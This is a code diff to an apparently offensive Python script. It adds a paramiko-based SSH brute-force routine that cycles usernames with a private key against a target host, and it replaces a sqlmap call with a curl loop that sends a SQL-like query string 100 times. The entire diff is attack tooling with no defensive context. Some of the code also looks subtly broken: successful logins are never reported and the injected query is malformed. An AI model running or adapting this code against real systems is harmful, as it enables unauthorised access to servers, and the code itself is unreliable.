@@ -52,17 +52,32 @@ def nikto():
     except Timeout:
         print("Timed out")
 
+def ssh_brute(ip, kf, ul_path):
+    k = paramiko.RSAKey.from_private_key_file(kf)
+    c = paramiko.SSHClient()
+    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    with open(ul_path, 'r') as f:
+        ul = [line.strip() for line in f.readlines()]
+    for u in ul:
+        try:
+            c.connect(hostname=ip, username=u, pkey=k, look_for_keys=False)
+            c.close()
+        except paramiko.AuthenticationException:
+            print(f"Failed for {u}")
+        except Exception as e:
+            print(f"Error: {e}")
+
 def hydra():
     try:
         with limit(120):
-            subprocess.run(["hydra", "-l", LOGIN, "-P", LIST, "-t", "64", "ssh://" + HYDRA], timeout=120)
+            ssh_brute(TARGET,KEY,LIST)
     except Timeout:
         print("Timed out")
 
 def sqli():
     try:
-        with limit(120):
-            subprocess.run(["sqlmap","--batch", "-u", 'http://'+TARGET+'/about-us.php?user=admin'], timeout=120)
+        for i in range(100):
+            subprocess.run(["curl","http://"+TARGET+"/users/?id=SELECT+*+FROM+users%22;"], timeout=120)
     except Timeout:
         print("Timed out")
 
